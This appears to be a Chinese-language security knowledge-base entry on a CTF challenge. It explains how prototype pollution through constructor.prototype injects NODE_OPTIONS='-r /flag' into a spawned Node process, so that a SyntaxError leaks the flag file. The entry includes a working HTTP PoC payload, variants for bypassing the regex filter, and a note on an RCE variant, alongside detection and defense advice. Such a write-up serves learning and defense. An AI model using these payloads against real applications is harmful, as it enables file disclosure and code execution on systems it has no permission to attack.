---
id: web-nodejs-prototype-pollution-node-options-require-flag
title: 原型链污染注入 NODE_OPTIONS=-r：node 子进程预加载 /flag，SyntaxError 回显泄露
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: prototype-pollution-node-options-preload
tags:
- nodejs
- prototype-pollution
- node-options
- child-process
- environment
- waf-bypass
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:26:50+08:00'
  notes: 已对照原文与图02核对：merge 仅过滤 __proto__、constructor.prototype 污染 NODE_OPTIONS=-r /flag、/api/status 用 for...in 复制 process.env 到 customEnv 并 spawn('node',...) 、正则只拦长选项 --require 不拦 -r、SyntaxError 回显 /flag 内容（图02 显示 XMCTF{8840fbce-9e2f-4c7e-8648-83a1e5bfe065}，Node v18.20.8）均一致。未验证点：无靶机，PoC 未复跑；原文未标注受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/nodejs/prototype-pollution/web-nodejs-prototype-pollution-node-options-require-flag/
draft: false
kb_aliases:
- ezpollute
- NODE_OPTIONS 污染
- -r /flag
- node 预加载
- constructor.prototype 绕过
- child_process spawn 环境变量
- SyntaxError 泄露
---

## 一句话结论

当 Node.js 的递归 merge 只过滤 `__proto__`、却允许 `constructor.prototype` 时，可以污染 `Object.prototype.NODE_OPTIONS`；后续 `/api/status` 把 `process.env` 复制进子进程环境并 `spawn('node', ...)`，Node 启动时读取 `NODE_OPTIONS=-r /flag`，把 `/flag` 当作模块预加载；由于 flag 内容不是合法 JS，`SyntaxError` 会把文件内容原样带进 stderr 并回显。

## 原理

- 目标 merge 函数遍历 `for (let key in source)`，只对 `key === '__proto__'` 做拦截/跳过；`constructor`、`prototype` 不在过滤名单中。
- 对普通对象 `target`，`target.constructor` 沿原型链找到 `Object` 构造函数，`target.constructor.prototype` 就是 `Object.prototype`；递归 merge 到 `prototype` 时，赋值实际写到共享原型：
  ```json
  {"constructor":{"prototype":{"NODE_OPTIONS":"-r /flag"}}}
  ```
- `/api/status` 构建 `customEnv` 时用 `for (let key in process.env)` 遍历环境变量；`process.env` 的原型是 `Object.prototype`，被污染的可枚举属性 `NODE_OPTIONS` 会出现在 `for...in` 中，并被 `customEnv[key] = process.env[key]` 复制。
- `spawn('node', ['-e', ...], {env: customEnv})` 启动子进程时，Node 会读取 `NODE_OPTIONS`。`-r`（`--require` 的短选项）表示在主程序执行前预加载指定模块；`/flag` 被当作 JS 文件加载。
- flag 内容通常不是合法 JavaScript（例如 `XMCTF{...}`），Node 解析时抛出 `SyntaxError: Unexpected token`，错误信息包含源码行/文件内容；`/api/status` 把子进程 stderr 拼进 `info` 返回，flag 因此泄露。
- 代码中的正则 `/(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i` 只拦长选项 `--require` 等，不拦短选项 `-r`，这是绕过点；`NODE_OPTIONS` 本身也不在 forbidden 关键字列表中。
- 根因是“原型链污染 + 把用户可控环境变量传给子进程 + Node 的 NODE_OPTIONS 预加载能力”三者叠加；单独的污染或单独的 spawn 都不足以泄露 flag。

## 触发条件

- 应用存在接受 JSON 的递归 merge，且只过滤 `__proto__`，未过滤 `constructor`/`prototype`，也未使用 `Object.create(null)` 或冻结原型。
- 后续有 `child_process.spawn`/`exec`/`fork` 把 `process.env` 或污染后的对象作为 `env` 传给 Node 子进程。
- 子进程使用 Node 运行时，且未显式删除/覆盖 `NODE_OPTIONS`；`-r` 短选项未被过滤。
- 目标文件（如 `/flag`）可读，且其内容不是合法 JS，能在 SyntaxError 中回显；或者预加载文件本身可执行代码（RCE 变体）。
- 攻击者能访问触发 merge 和子进程的接口。

## 利用步骤

1. 确认 `/api/config` 的 merge 行为：先发 `{"__proto__":{"x":1}}` 观察是否被拦截；再发 `{"constructor":{"prototype":{"x":1}}}` 测试绕过。
2. 污染 `NODE_OPTIONS`：
   ```json
   {"constructor":{"prototype":{"NODE_OPTIONS":"-r /flag"}}}
   ```
3. 触发 `/api/status`（或任何会 spawn Node 子进程的接口），观察返回的 `info`/stderr。
4. 若 `/flag` 不存在或不可读，改用可写文件/远程模块；若 `-r` 被拦，尝试 `--require` 的等价短写、`--import`、`NODE_PATH`、`--experimental-loader` 等（注意目标正则）。
5. 从 `SyntaxError` 中提取 flag；若预加载的是攻击者可控的合法 JS 文件，则可直接执行代码（RCE）。

## PoC

```http
POST /api/config HTTP/1.1
Host: target
Content-Type: application/json

{"constructor":{"prototype":{"NODE_OPTIONS":"-r /flag"}}}
```

```http
GET /api/status HTTP/1.1
Host: target
```

响应示意：

```json
{
  "status": "checked",
  "info": "/flag:1\nXMCTF{...}\n    ^\n\nSyntaxError: Unexpected token ...\n    at Module._compile ..."
}
```

## 变体与关联

- **污染路径变体**：`constructor.prototype`、嵌套 `a.constructor.prototype`、`__proto__` 的 Unicode/表单编码、`Object.prototype` 直接赋值。
- **预加载变体**：`-r`、`--require`、`--import`、`--experimental-loader`、`NODE_PATH`、`--openssl-config`；不同 Node 版本支持的选项不同。
- **子进程变体**：`spawn`、`exec`、`fork`、`execFile`；`env` 可能是 `process.env`、`{...process.env}` 或自定义对象；只要包含污染键即可。
- **影响变体**：读文件（SyntaxError 回显）、RCE（预加载合法 JS）、篡改子进程行为（`--inspect`、`--max-old-space-size`）。
- **关联**：[[web-nodejs-prototype-pollution-filter-bypass]]（`constructor.prototype` 等污染绕过）；[[web-nodejs-prototype-pollution-merge-json-parse]]（JSON.parse 与对象字面量的 `__proto__` 差异）；[[web-nodejs-vm2-buffer-slab-jwt-secret-leak]]（Node 沙箱/密钥泄露的另一场景）。
- **边界**：若 merge 过滤 `constructor`/`prototype`、使用 `Object.create(null)` 配置对象、子进程 env 不含污染键、或 Node 启动时禁用 `NODE_OPTIONS`，本路径失效。

## 检测与防御

- **检测**：请求体出现 `constructor`、`prototype`、`NODE_OPTIONS`、`-r`、`--require`；`/api/config` 后紧跟 `/api/status` 等 spawn 接口；子进程 stderr 出现 `SyntaxError` 且包含文件内容。
- **防御**：merge 使用键白名单，拒绝 `__proto__`/`constructor`/`prototype` 及所有 dunder；配置对象用 `Object.create(null)`，必要时 `Object.freeze(Object.prototype)`。
- **加固**：不要把孩子进程的 `env` 直接设为 `process.env`；显式构造最小环境变量并删除 `NODE_OPTIONS`、`NODE_PATH` 等危险变量；子进程使用受限用户/沙箱。
- **检测**：监控子进程启动参数中的 `-r`/`--require` 与异常 `NODE_OPTIONS`；对 `/api/config` 的异常 JSON 结构告警。
